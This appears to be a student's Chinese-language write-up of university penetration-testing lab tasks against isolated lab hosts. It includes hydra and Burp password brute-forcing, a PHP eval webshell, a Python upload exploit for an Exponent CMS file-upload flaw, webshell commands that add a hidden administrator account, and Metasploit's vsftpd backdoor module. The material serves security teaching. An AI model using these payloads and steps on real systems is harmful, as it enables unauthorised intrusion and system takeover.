<h3 id="【实验环境】"><a href="#【实验环境】" class="headerlink" title="【实验环境】"></a>【实验环境】</h3><p><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:crunch" target="_blank" rel="noopener">crunch</a>（继承于kali linux）</p>
<p><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:hydra" target="_blank" rel="noopener">hydra</a>（继承于kali linux）</p>
<h3 id="【实验步骤】-1"><a href="#【实验步骤】-1" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h3><p>2.1在操作机使用相关工具生成密码字典文件password.txt，要求从字符串“hacker +123456”中，随机选9个字符进行排列组合。</p>
<p>⭐提示：可以使用Kali linux集成的crunch工具来完成【操作步骤】2.1，也可以通过操作机自行上传其他工具来完成。</p>
<p>crunch命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">-p#</span><span class="bash">定义密码元素 字符串 或者-p 单词1 单词2 ...以排列组合的方式来生成字典。</span></span><br></pre></td></tr></table></figure>

<p>9 9表示生成最短长度为9位，最长长度为9位，-o 的意思是保存为XXX文件，-p是指以排列组合的方式来生成字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 9 9 password.txt -p hacker+123456</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523121823112.png" alt="image-20200523121823112"></p>
<blockquote>
<p> ⭐吐槽：实验设计不合理，密码排列组合过多，磁盘空间不够（10G+），虚拟机存活时间不能满足（1天）</p>
<p> 按理说排列组合的公式如下</p>
<p> <img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523122101396.png" alt="image-20200523122101396">而crunch算hacker+123456（13个字符选9个）的密码排列组合预计6227020800=13!个明显是算错了，不过无所谓通过查看磁盘分区命令，可以看到磁盘大够满足字典的大小</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -hl</span><br></pre></td></tr></table></figure>
<p> <img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523113534965.png" alt="image-20200523113534965"></p>
<p> 可以看到，本虚拟机最多空闲空间10多G，无法满足我们的需求<br> 所以我继而使用hacker+123（10个字符选9个）的排列组合</p>
<p> <img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523113205792.png" alt="image-20200523113205792"></p>
<p> 需要遍历10！=3628000个密码，然而在后面用hydra工具破解时，平均2秒过一个密码我们来计算一下时间3628000*2/60/60=2015 hours （然鹅虚拟机晚上就关闭了，没有足够的时间来完成遍历）</p>
<p> 即使选择hacker123（9个字符选9个）的排列组合,需要9！=362,880‬，一顿计算下来需要时间201小时，仍然不能遍历完成！！</p>
<p> 不过我们死马当活马医，没准hacker+123456的组合6227020800个密码，一开始就遍历到了呢？</p>
</blockquote>
<p>生成完成，查看生成的密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat password.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523112951808.png" alt="image-20200523112951808"></p>
<p>2.2在操作机使用相关工具爆破目标机（192.168.1.3）远程用户hacker的密码。</p>
<p>⭐提示：可以使用Kali linux集成的hydra工具来完成【操作步骤】2.2，也可以通过操作机自行上传其他工具来完成。</p>
<p>这里的破解用户指的是，破解ssh用户</p>
<p>由于其要求用户名必须在txt文件中，所以我们先将hacker存到hacker.txt中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">touch hacker.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="built_in">echo</span> <span class="string">"hacker"</span>&gt;hacker.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cat hacker.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">hacker</span></span><br></pre></td></tr></table></figure>

<p>然后我们输出ssh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt -t 1 -vV -e ns ip ssh 默认</span><br><span class="line">hydra -L hacker.txt -P password.txt -t 1 -vV -e ns 192.168.1.3 ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523114827811.png" alt="image-20200523114827811"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523115214026.png" alt="image-20200523115214026"></p>
<p>最终我们跑得目标密码结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ssh] host:192.168.1.3 login:hacker  password:hacker123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523123534717.png" alt="image-20200523123534717"></p>
<h3 id="【实验结果】-1"><a href="#【实验结果】-1" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将hydra破解的密码作为【实验结果】提交，提交成功后该实验任务完成</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523123723175.png" alt="image-20200523123723175"></p>
<h2 id="任务3-使用ssh登录目标机并获取key值，获得敏感信息"><a href="#任务3-使用ssh登录目标机并获取key值，获得敏感信息" class="headerlink" title="任务3-使用ssh登录目标机并获取key值，获得敏感信息"></a>任务3-使用ssh登录目标机并获取key值，获得敏感信息</h2><h3 id="【任务描述】"><a href="#【任务描述】" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><ul>
<li><p>本实验任务在任务二操作完成的基础上，远程连接目标机，获得敏感信息。</p>
</li>
<li><p>通过完成本实验任务，要求学生掌握使用ssh远程连接目标机的方法，并在进入系统后，掌握查看文件信息的命令。</p>
</li>
</ul>
<h3 id="【实验目标】-2"><a href="#【实验目标】-2" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><p>掌握使用ssh远程连接目标机的方法</p>
<p>使用相关命令，查看文件内容，获得敏感信息</p>
<h3 id="【实验工具】-1"><a href="#【实验工具】-1" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:ssh" target="_blank" rel="noopener">ssh</a></p>
<p>linux命令：ls、more</p>
<h3 id="【操作步骤】"><a href="#【操作步骤】" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>ssh登陆</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.10</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523153142138.png" alt="image-20200523153142138"></p>
<p>linux命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">more 1.key</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ettercap</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523153247375.png" alt="image-20200523153247375"></p>
<h3 id="【实验结果】-2"><a href="#【实验结果】-2" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将1.key文件中的内容作为【实验结果】提交，提交成功后该实验任务完成</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523153717886.png" alt="image-20200523153717886"></p>
<h2 id="任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务4-获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><h3 id="【任务描述】-1"><a href="#【任务描述】-1" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<ul>
<li>编写脚本，获得目标机网站webshell权限。</li>
<li>向目标机添加新用户，以便完全控制目标主机系统，获得敏感信息。</li>
</ul>
<p>通过完成本实验任务，要求学生在掌握webshell上传及权限获取方法的基础上，掌握向目标机添加新用户，设置用户权限并实现目标机控制的方法，进而掌握企业级复杂网络webshell相关的高级漏洞挖掘和利用方法，具备信息系统安全管理职业能力。</p>
<h3 id="【实验目标】-3"><a href="#【实验目标】-3" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>理解webshell权限获取的意义和方法。</li>
<li>掌握获取webshell权限基础上控制目标机的方法。</li>
<li>掌握企业级复杂网络漏洞挖掘和利用方法。</li>
<li>具备信息系统安全管理职业能力。</li>
</ul>
<h3 id="【实验工具】-2"><a href="#【实验工具】-2" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p><a href="http://210.42.123.2:8088/doku.php?id=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%B7%A5%E5%85%B7:firefox" target="_blank" rel="noopener">firefox</a></p>
<p>python</p>
<h3 id="【操作步骤】-1"><a href="#【操作步骤】-1" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>🚀本实验主要基于一个开源内容管理系统Exponent-cms任意文件上传漏洞分析 (cve-2016-7095)的基础上的。(安全客分析)[<a href="https://www.anquanke.com/post/id/84514]" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84514]</a></p>
<ul>
<li>没有对后缀名进行一个检测，可以上传任意文件。文件命名的方式是time()+下划线+文件名。</li>
<li>紧跟着就有一个文件删除的操作。</li>
<li>但在删除之前，调用了一个正则匹配是验证你是否是有效的邮箱地址，如果不是有效的邮箱地址，就会throw出错误信息，也导致了程序的文件删除操作无法执行。</li>
</ul>
<p>⭐ <code>startx</code>进入kali图形化界面</p>
<p><strong>4.1</strong>在操作机创建脚本，建立一个上传表单；建立一个php文件，作为一句话木马。通过上传表单上传一句话。</p>
<blockquote>
<p>提示：对于该步骤，上传表单可使用html，也可以通过操作机自行上传自己已有的脚本来完成。</p>
</blockquote>
<p>在很多的渗透过程中，渗透人员会上传一句话木马（简称Webshell）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。【基本原理】@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最简单的一句话木马：</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'attack'</span>]) <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#本实验的木马，添加phpinfo显示PHP的当前信息</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="keyword">eval</span>($_REQUEST[cmd]); 	phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523173026295.png" alt="image-20200523173026295"></p>
<p>如下建立上传表单：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523170530261.png" alt="image-20200523170530261"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#url</span></span><br><span class="line">url_for_upload=<span class="string">'http://192.168.1.4/index.php?module=eventregistration&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1'</span></span><br><span class="line"><span class="comment">#打开文件</span></span><br><span class="line">files=&#123;<span class="string">'attach'</span>:open(<span class="string">'index.php'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">requests.post(url_for_upload,files=files)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'upload finish'</span></span><br></pre></td></tr></table></figure>

<p><strong>4.2</strong>在浏览器另外一个页面快速打开<code>http://192.168.1.4/index.php?module=eventregistration&amp;amp;action=eventsCalendar</code>，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。</p>
<p><strong>4.3</strong>编写脚本并运行，获得上传的文件的URL路径。</p>
<p>（提示：对于该步骤，可使用python来编写脚本，也可以使用其他语言来编写脚本，或者通过操作机自行上传自己已有的脚本来完成）</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523165356054.png" alt="image-20200523165356054"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523170304481.png" alt="image-20200523170304481"></p>
<p>上传YijuHua.php</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523172751055.png" alt="image-20200523172751055"></p>
<p>运行代码，找到了</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523172604037.png" alt="image-20200523172604037"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523173238445.png" alt="image-20200523173238445"></p>
<p><strong>4.4</strong>在浏览器地址栏中输入“<code>http://192.168.1.4/ tmp/1516041535_exp.php?cmd=system(&#39;cmd命令&#39; );</code>”，通过设置不同的system()函数命令参数（这里以cmd命令指代），并执行相应命令，如查看端口、用户等。</p>
<p>查看端口：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523173737856.png" alt="image-20200523173737856"></p>
<p><strong>4.5</strong>向目标机网站（http：//192.168.1.4）添加新用户，用户名：hacker，密码：Beijing123。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user hacker Beijing123 /add</span><br></pre></td></tr></table></figure>

<p><strong>4.6</strong>把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators hacker /add</span><br></pre></td></tr></table></figure>

<p><strong>4.7</strong>以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。</p>
<p>（提示：可使用工具rdesktop远程连接目标机，远程连接端口可通过在浏览器中使用system()函数执行相关命令来获得）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.1.4:35155</span><br></pre></td></tr></table></figure>

<p>4.8设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。</p>
<p>设置权限——完全控制</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204924371.png" alt="image-20200529204924371"></p>
<h3 id="【实验结果】-3"><a href="#【实验结果】-3" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><p>将探测到的目标机上key2.txt文件的内容作为【实验结果】提交，提交成功后该实验任务完成。</p>
<p>结果如下：</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523175321680.png" alt="image-20200523175321680"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523175425720.png" alt="image-20200523175425720"></p>
<h1 id="1-2-漏洞挖掘实验"><a href="#1-2-漏洞挖掘实验" class="headerlink" title="1.2 漏洞挖掘实验"></a>1.2 漏洞挖掘实验</h1><h2 id="任务一-使用nmap、MSF和Metasploit进行漏洞挖掘和利用"><a href="#任务一-使用nmap、MSF和Metasploit进行漏洞挖掘和利用" class="headerlink" title="任务一 使用nmap、MSF和Metasploit进行漏洞挖掘和利用"></a>任务一 使用nmap、MSF和Metasploit进行漏洞挖掘和利用</h2><h3 id="【任务描述】-2"><a href="#【任务描述】-2" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用kali集成的扫描工具nmap，对网络进行探测，收集目标网络存活主机信息，并利用主机开放的服务器，获取目标主机的root权限。
利用kali集成的MSF和Metasploit两个工具，实现对目标主机的漏洞探测和利用，并成功攻击目标机。</code></pre><p>通过完成本实验任务，要求学生掌握利用nmap进行网络探测并获取目标主机root权限等关键信息的方法；掌握通过MSF和Metasploit实现对目标主机的漏洞探测和漏洞模块利用的流程、方法和技巧，为完成后续漏洞挖掘实验任务奠定坚实的网络探测技术基础。</p>
<h3 id="【实验目标】-4"><a href="#【实验目标】-4" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
了解扫描工具nmap的基本使用方法，掌握常用的网络扫描和探测命令。
掌握利用nmap进行网络探测并获取目标主机root权限等关键信息的方法。
了解MSF和Metasploit工具的基本功能，掌握常用的漏洞探测和利用命令。
掌握通过MSF和Metasploit实现对目标主机的漏洞探测和漏洞模块利用技术和方法。</code></pre><p>通过nmap、MSF和Metasploit等工具的学习和使用，能够融会贯通，掌握自主学习和实践主流企业级网络扫描工具功能、操作技巧、检测结果分析、漏洞挖掘的常用方法，最终具备企业复杂网络漏洞挖掘的职业能力。</p>
<h3 id="【实验工具】-3"><a href="#【实验工具】-3" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nmap" target="_blank" rel="noopener">nmap</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:msf" target="_blank" rel="noopener">msf</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:metasploit" target="_blank" rel="noopener">metasploit</a>（集成于kali linux）</li>
</ul>
<h3 id="【操作步骤】-2"><a href="#【操作步骤】-2" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.1在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、操作系统及版本信息。</p>
<blockquote>
<p> 提示：可以使用Kali linux集成的nmap工具来完成【操作步骤】1.1，也可以通过操作机自行上传其他工具来完成。</p>
<p>注意：nmap命令功能较强，参数众多，不同命令执行需要的时间长短不一(长则数分钟)。若遇到长时间没有结果返回，建议ctrl-c停止执行，并更换命令参数，或者增加-v获取更详细的扫描进展</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24 #扫描网段内存活主机</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529105450765.png" alt="image-20200529105450765"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -F 192.168.1.3</span><br><span class="line">nmap -F 192.168.1.4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529105728752.png" alt="image-20200529105728752"></p>
<p>1.2使用网络扫描工具搜索vsftpd FTP服务器程序的相关工具和攻击载荷，搜索出vsftpd FTP服务器的漏洞利用模块信息，并启用漏洞利用模块，设置目标主机的IP地址,然后扫描探测可以在目标主机执行的shellcode代码，并在远程目标主机执行该shellcode代码。最后对目标主机实施溢出攻击。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的MSF工具来完成【操作步骤】1.2，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search vsftpd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529110348767.png" alt="image-20200529110348767"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">set rhost 192.168.1.3</span><br><span class="line">set payload cmd/unix/interact</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529110758676.png" alt="image-20200529110758676"></p>
<p>1.3在目标主机上查找扩展名为key的文件，并查看1.key文件内容。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的MSF工具来完成【操作步骤】1.3，也可以通过操作机自行上传其他工具或使用其他命令来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br><span class="line"><span class="meta">#</span><span class="bash">查找/目录中文件名为1.key的文件</span></span><br><span class="line">find / -name 1.key</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /usr/src/1.key</span></span><br><span class="line">cat /usr/src/1.key</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> metasploit</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529112613572.png" alt="image-20200529112613572"></p>
<h3 id="【实验结果】-4"><a href="#【实验结果】-4" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将1.key文件中的内容作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529112828342.png" alt="image-20200529112828342"></p>
<h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><h3 id="【任务描述】-3"><a href="#【任务描述】-3" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用kali集成的扫描工具nikto和crunch，对目标网站进行探测，根据收集的信息进行渗透(提交网站后台管理员登陆密码)，获取网站的webshell。
使用burpsuit工具软件暴力破解目标网站管理员登陆密码，以完全控制目标主机系统。</code></pre><p>通过完成本实验任务，要求学生掌握对网站进行探测和渗透的技术和工具使用方法，具体包括：利用nikto进行网页服务器探测扫描的方法；掌握使用crunch生成密码字典文件的方法；掌握burpsuit工具软件暴力破解登陆密码的方法，具备更为夯实的漏洞挖掘和利用、信息系统安全防范的职业能力。</p>
<h3 id="【实验目标】-5"><a href="#【实验目标】-5" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>了解网络漏洞渗透、webshell的概念，认知常用的安全漏洞扫描工具。</li>
<li>了解nikto工具的基本功能，熟悉其常用的网页服务器扫描和探测命令。</li>
<li>了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</li>
<li>了解burpsuit工具的基本功能，掌握其暴力破解密码的基本方法。</li>
</ul>
<p>通过nikto、crunch和burpsuit等工具的学习和使用，掌握对网站进行渗透、获取webshell、破解密码等常用的漏洞挖掘和利用技术，领会预防漏洞攻击的方法，具备丰富的漏洞挖掘和防攻击能力。</p>
<h3 id="【实验工具】-4"><a href="#【实验工具】-4" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:nikto" target="_blank" rel="noopener">nikto</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:crunch" target="_blank" rel="noopener">crunch</a>（集成于kali linux）</li>
<li><a href="http://210.42.123.2:8088/doku.php?id=网络安全实验命令与工具:burpsuit" target="_blank" rel="noopener">burpsuit</a></li>
</ul>
<h3 id="【操作步骤】-3"><a href="#【操作步骤】-3" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>2.1在操作机终端中扫描目标机网站（<code>http://192.168.1.4</code>）目录结构，查看目标网站的/admin/login.php后台管理界面。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的Nikto工具来完成【操作步骤】2.1，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p>⭐ <code>startx</code>进入kali图形化界面</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529114055478.png" alt="image-20200529114055478"></p>
<p>2.2在目标机的/root/目录下创建password.txt字典文件，生成字典文件的目的是为了暴力破解做准备，为了让生成的密码字典可能包含真正的密码，我们一般需要提前做一些社工工作，根据常人使用弱口令的习惯生成字典文件，例如：用户名为admin,则：密码可能为admin加3-5位数字的字符串。暴力破解是一个比较耗时的操作，本次实验只是为了教学使用。因此大家可以尝试使用crunch命令，生成一个每行以admin开头加3位随机数字共8位字符串长度的字典文件。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的crunch工具来完成【操作步骤】2.2，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 8 8 /rrot/password.txt -t admin%%%</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529114727202.png" alt="image-20200529114727202"></p>
<p>2.3在操作机中使用Firefox浏览器访问目标网站。通过以下链接打开后台管理界面：<code>http://192.168.1.4/admin/login.php</code>。在登录窗口中输入用户名和密码信息，用户名：admin，密码：123456。</p>
<p>2.4使用Firefox浏览器工具栏中的“设置”工具进行“Manual Proxy”配置，配置信息如图所示。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">about:preferences#advanced</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529120324890.png" alt="image-20200529120324890"></p>
<p>2.5在操作机中打开burpsuit软件，同时在目标机网站登录对话框中，单击“Submit”按钮，登录网站后台，这时burpsuit将截取发送的数据包。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529121231754.png" alt="image-20200529121231754"></p>
<p>2.6 在BurpSuite操作窗口中，查看截取到的目标机登录用户名和密码信息，操作画面如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529121354225.png" alt="image-20200529121354225"></p>
<p>2.7对password字段进行暴力破解，并提交破解的登录密码password的值。</p>
<blockquote>
<p>提示：可以使用BurpSuite工具来完成对目标网站用户admin登录密码的破解，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<blockquote>
<p>注意：使用burpsuit工具进行密码破解时，由于使用了请求重定向技术，请求都将被代理到burpsuit。也正是因为请求被代理，所以将产生临时性网页无法正常打开、进入等待状态的现象。密码破解成功后取消代理即可恢复正常，正常打开所需网页。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529121636111.png" alt="image-20200529121636111"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123054298.png" alt="image-20200529123054298"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123704550.png" alt="image-20200529123704550"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123808639.png" alt="image-20200529123808639"></p>
<h3 id="【实验结果】-5"><a href="#【实验结果】-5" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将破解的admin登录密码作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123724462.png" alt="image-20200529123724462"></p>
<h2 id="任务三获取webshell权限并拿到目标机开放的远程桌面端口号"><a href="#任务三获取webshell权限并拿到目标机开放的远程桌面端口号" class="headerlink" title="任务三获取webshell权限并拿到目标机开放的远程桌面端口号"></a>任务三获取webshell权限并拿到目标机开放的远程桌面端口号</h2><h3 id="【任务描述】-4"><a href="#【任务描述】-4" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务二操作完成的基础上，上传目标机网站的webshell,然后利用获取的网站webshell权限，查看目标主机信息,提交目标主机远程桌面端口号，为下一任务添加用户，完全控制目标主机系统做环境准备。</p>
<p>通过完成本实验任务，要求学生理解webshell的概念，掌握webshell上传方法，以及通过webshell查看目标机信息的方法。</p>
<h3 id="【实验目标】-6"><a href="#【实验目标】-6" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法。</li>
<li>掌握通过网站webshell信息获取其用户及密码信息的方法。</li>
<li>掌握通过webshell查看目标机关键信息的方法。</li>
</ul>
<h3 id="【实验工具】-5"><a href="#【实验工具】-5" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p>Firefox（火狐浏览器）</p>
<h3 id="【操作步骤】-4"><a href="#【操作步骤】-4" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>3.1在任务二的实验基础上，使用破解的管理员用户信息登录目标机网站后台，用户名：admin，密码：admin452。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529194505404.png" alt="image-20200529194505404"></p>
<p>3.2登录目标机网站后台后，设置用户自定义标记（Add User Defined Tag），配置信息为name：“hacker”，code：“system(“whoami”);”，如图3-1所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529124144298.png" alt="image-20200529124144298"></p>
<p>输入<code>hacker，system(&quot;whoami&quot;);</code>，提交</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529124232644.png" alt="image-20200529124232644"></p>
<p>点击新添加的tags：hacker</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529194649256.png" alt="image-20200529194649256"></p>
<p>然后点击<code>RUN</code>，系统返回执行结果。可以看到页面输出了以下内容，我们获取了root用户权限。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529124447025.png" alt="image-20200529124447025"></p>
<p>3.3在如图3-1所示画面中的code区域，尝试设置不同的system()函数命令参数，并执行相应命令，最终获取目标网站webshell提权。在浏览器地址栏中输入“ <code>http://192.168.1.4/1.php?m=system(“whoami”);</code>” ，执行命令“whoami”,显示webshell权限，如图所示。</p>
<p>通过触发一个错误，我们可以看到，当前路径名，这样我们就可以把木马文件植入到这个目录下了。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529195532320.png" alt="image-20200529195532320"></p>
<p>我们可以利用这个code区，上传一句话木马文件。</p>
